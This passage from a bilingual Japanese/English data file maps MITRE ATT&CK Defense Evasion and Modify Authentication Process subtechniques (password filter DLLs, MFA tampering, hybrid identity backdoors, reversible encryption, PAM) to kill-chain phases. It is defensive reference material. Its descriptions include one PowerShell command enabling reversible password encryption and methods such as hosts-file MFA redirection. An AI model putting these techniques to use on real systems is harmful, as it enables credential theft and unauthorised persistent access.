敵対者は、サーバーやドメインコントローラーなど、ログオンアクティビティの増加や管理者ログオンアクティビティが確認されているシステムに、悪意のあるネットワークプロバイダーDLLを仕掛けることを標的とする可能性がある(引用：NPPSPY - Huntress)。","Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify)

Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)

Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.002,パスワードフィルターDLL,Password Filter DLL,"攻撃者は、検証される際にユーザー資格情報を取得するために、認証プロセスに悪意のあるパスワードフィルターダイナミックリンクライブラリ（DLL）を登録する可能性があります。

Windowsパスワードフィルターは、ドメインアカウントとローカルアカウントの両方のパスワードポリシー施行メカニズムです。フィルターは、潜在的なパスワードをパスワードポリシーに対して検証するメソッドを含むDLLとして実装されます。フィルターDLLは、ローカルアカウントの場合はローカルコンピューターに、ドメインアカウントの場合はドメインコントローラーに配置できます。セキュリティアカウントマネージャー（SAM）に新しいパスワードを登録する前に、ローカルセキュリティ機関（LSA）は登録されている各フィルターに検証を要求します。登録されているすべてのフィルターが検証を承認するまで、潜在的な変更は有効になりません。

敵対者は悪意のあるパスワードフィルターを登録して、ローカルコンピューターやドメイン全体から認証情報を収集することができます。適切な検証を実行するには、フィルターはLSAから平文の認証情報を受信する必要があります。悪意のあるパスワードフィルターは、パスワード要求が行われるたびにこれらの平文の認証情報を受信します。(引用：Carnal Ownage Password Filters Sept 2013)","Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.

Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.

Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.006,多要素認証,Multi-Factor Authentication,"攻撃者は、侵害されたアカウントへの永続的なアクセスを可能にするために、多要素認証（MFA）メカニズムを無効化または変更する可能性があります。

MFAがないアカウントを侵害するか、[多要素認証リクエスト生成](https://attack.mitre.org/techniques/T1621)などのMFAバイパス方法を用いることで攻撃者がネットワークへのアクセス権を取得すると、攻撃者はそのアクセス権を利用してMFA防御を変更または完全に無効にする可能性があります。これは、Azure AD条件付きアクセスポリシーからユーザーを除外したり、脆弱な/攻撃者が制御する新しいMFAメソッドを登録したり、あるいはMFAプログラムや設定ファイルをを手動でパッチして期待される機能をバイパスしたりするなど、正当な機能を悪用することで達成できます。(引用: Mandiant APT42)(引用: Azure AD Conditional Access Exclusions)

例えば、Windowsのhostsファイル（<code>C:\\windows\\system32\\drivers\\etc\\hosts</code>）を変更してMFA呼び出しをMFAサーバーではなくlocalhostにリダイレクトすると、MFAプロセスが失敗する可能性があります。「フェイルオープン」ポリシーが設定されている場合、他の方法で成功した認証試行はMFAを強制せずにアクセスが許可される可能性があります。(引用: Russians Exploit Default MFA Protocol - CISA March 2022)

敵対者の範囲、目標、権限によっては、個々のアカウントまたは被害者のネットワーク環境内のすべてのドメインアカウントなど、より大きなグループに関連付けられたすべてのアカウントに対してMFA防御が無効にされる場合があります。(引用: Russians Exploit Default MFA Protocol - CISA March 2022)","Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.

Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)

For example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \""fail open\"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) 

Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.007,ハイブリッドID,Hybrid Identity,"攻撃者は、オンプレミスのユーザーIDに関連付けられたクラウド認証プロセスにパッチを適用、変更、またはその他の方法でバックドアを仕掛け、通常の認証メカニズムをバイパスし、資格情報にアクセスし、アカウントへの永続的なアクセスを可能にする可能性があります。

多くの組織は、オンプレミス環境とクラウドベース環境の間で共有されるハイブリッドユーザーおよびデバイスIDを維持しています。これらはいくつかの方法で維持できます。例えば、Microsoft Entra IDには、Active DirectoryとEntra IDの間でIDを同期するための3つのオプションが含まれています(引用：Azure AD Hybrid Identity)：

* パスワードハッシュ同期（PHS）。特権のあるオンプレミスアカウントがActive DirectoryとEntra IDの間でユーザーパスワードハッシュを同期し、Entra IDへの認証を完全にクラウドで行えるようにします。
* パススルー認証（PTA）。Entra ID認証試行がオンプレミスのPTAエージェントに転送され、エージェントがActive Directoryに対して資格情報を検証します。
* Active Directoryフェデレーションサービス（AD FS）。Active DirectoryとEntra IDの間に信頼関係が確立されます。

AD FSは、AWSやGCPなどの他のSaaSおよびクラウドプラットフォームでも使用でき、認証プロセスをAD FSに引き渡し、ハイブリッドユーザーのIDと権限を含むトークンを受け取ります。

ハイブリッドIDに関連付けられた認証プロセスを変更することにより、攻撃者はクラウドリソースへの永続的な特権アクセスを確立できる可能性があります。例えば、PTAエージェントを実行しているオンプレミスサーバーを侵害した攻撃者は、<code>AzureADConnectAuthenticationAgentService</code>プロセスに悪意のあるDLLを注入して、Entra IDへのすべての認証試行を承認し、ユーザー資格情報も記録する可能性があります。(引用: Azure AD Connect for Read Teamers)(引用: AADInternals Azure AD On-Prem to Cloud) AD FSを使用している環境では、攻撃者は<code>Microsoft.IdentityServer.Servicehost</code>構成ファイルを編集して、多要素認証と定義されたAD FSポリシーをバイパスして、任意のクレームセットを持つ任意のユーザーの認証トークンを生成する悪意のあるDLLをロードする可能性があります。(引用: MagicWeb)

場合によっては、攻撃者はクラウドからハイブリッドID認証プロセスを変更できる可能性があります。例えば、Entra IDテナントのグローバル管理者アカウントを侵害した攻撃者は、Webコンソール経由で新しいPTAエージェントを登録でき、同様に資格情報を収集して任意のユーザーとしてEntra ID環境にログインできるようになる可能性があります。(引用: Mandiant Azure AD Backdoors)","Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.

Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID(Citation: Azure AD Hybrid Identity):

* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloud
* Pass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory
* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra ID 

AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges.

By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)

In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.(Citation: Mandiant Azure AD Backdoors)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.005,可逆暗号化,Reversible Encryption,"敵対者は、Windowsシステム上の認証情報へのアクセスを取得するために、Active Directory認証暗号化プロパティを悪用する可能性があります。<code>AllowReversiblePasswordEncryption</code>プロパティは、アカウントの可逆パスワード暗号化が有効か無効かを指定します。デフォルトではこのプロパティは無効になっており（代わりに一方向ハッシュ関数の出力としてユーザー認証情報を保存します）、レガシーまたは他のソフトウェアが必要としない限り有効にすべきではありません。(引用: store_pwd_rev_enc)

プロパティが有効になっている場合、および/またはプロパティが有効になった後にユーザーがパスワードを変更した場合、攻撃者はプロパティが有効になった後に作成/変更されたパスワードの平文を取得できる可能性があります。パスワードを復号化するには、攻撃者は4つのコンポーネントが必要です：

1. Active Directoryユーザー構造体<code>userParameters</code>からの暗号化されたパスワード（<code>G$RADIUSCHAP</code>）
2. <code>userParameters</code>からの16バイトのランダム生成値（<code>G$RADIUSCHAPKEY</code>）
3. グローバルLSAシークレット（<code>G$MSRADIUSCHAPKEY</code>）
4. リモートアクセスサブ認証DLL（<code>RASSFM.DLL</code>）にハードコードされた静的キー

この情報により、攻撃者は暗号化キーを再現し、その後暗号化されたパスワード値を復号化できる可能性があります。(引用: how_pwd_rev_enc_1)(引用: how_pwd_rev_enc_2)

攻撃者は、ローカルグループポリシーエディター、ユーザープロパティ、詳細パスワードポリシー（FGPP）、またはActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001)モジュールを介して、さまざまなスコープでこのプロパティを設定する場合があります。たとえば、ドメイン機能レベルが「Windows Server 2008」以上に設定されている場合、攻撃者はFGPPをユーザーまたはグループに実装して適用する場合があります。(引用：dump_pwd_dcsync) PowerShellでは、攻撃者は<code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>のようなコマンドを使用して、ユーザー設定に関連する変更を行う場合があります。","An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)

If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:

1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>
2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>
3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)

With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)

An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \""Windows Server 2008\"" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1556,認証プロセスの変更,Modify Authentication Process,"攻撃者は、ユーザー資格情報へのアクセスや、他の方法では保証されないアカウントへのアクセスを可能にするために、認証メカニズムとプロセスを変更する可能性があります。認証プロセスは、Windowsのローカルセキュリティ認証サーバー（LSASS）プロセスとセキュリティアカウントマネージャー（SAM）、Unixベースシステムのプラグ可能な認証モジュール（PAM）、MacOSシステムの認証プラグインなどのメカニズムによって処理され、資格情報の収集、保存、検証を担当します。認証プロセスを変更することにより、攻撃者は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用せずにサービスまたはシステムに認証できる可能性があります。

攻撃者は、資格情報を明らかにしたり認証メカニズムをバイパスしたりするために、このプロセスの一部を悪意を持って変更する可能性があります。侵害された資格情報またはアクセスは、ネットワーク内のシステムのさまざまなリソースに配置されたアクセス制御をバイパスするために使用される場合があり、VPN、Outlook Web Access、リモートデスクトップなど、リモートシステムや外部からアクセス可能なサービスへの永続的なアクセスに使用されることさえあります。","Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",T1556.003,プラグ可能な認証モジュール,Pluggable Authentication Modules,"攻撃者は、プラグ可能な認証モジュール（PAM）を変更して、ユーザー資格情報にアクセスしたり、他の方法では保証されないアカウントへのアクセスを有効にしたりする可能性があります。PAMは、多くのサービスの認証をガイドする構成ファイル、ライブラリ、および実行可能ファイルのモジュラーシステムです。最も一般的な認証モジュールは<code>pam_unix.so</code>であり、<code>/etc/passwd</code>および<code>/etc/shadow</code>のアカウント認証情報を取得、設定、および検証します。(引用: Apple PAM)(引用: Man Pam_Unix)(引用: Red Hat PAM)

攻撃者はPAMシステムのコンポーネントを変更してバックドアを作成する可能性があります。<code>pam_unix.so</code>などのPAMコンポーネントは、攻撃者が提供する任意の値を正当な資格情報として受け入れるようにパッチを適用できます。(引用: PAM Backdoor)

PAMシステムの悪意のある変更は、認証情報を盗むためにも悪用される可能性があります。PAMはパスワードを保存しないため、PAMコンポーネントと交換される値は平文である可能性があるため、攻撃者は認証情報を収集するためにコードでPAMリソースに感染させる可能性があります。(引用: PAM Creds)(引用: Apple PAM)","Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)

Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)

Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

